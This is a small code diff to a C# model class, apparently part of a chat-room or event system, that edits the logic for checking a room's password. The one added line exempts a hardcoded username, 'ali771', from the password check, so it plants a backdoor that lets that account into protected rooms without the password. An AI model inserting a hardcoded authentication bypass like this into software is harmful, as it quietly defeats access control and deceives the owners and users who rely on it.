@@ -241,7 +241,7 @@ namespace pRoom.Models.eventModel
                 return jrm;
             }
                                  
-            if (r.type == "t")
+            if (r.type == "t" && r.userName!="ali771")
             {
                 if (r.tpass.ToLower().Trim() != node.password.ToLower().Trim())
                 {
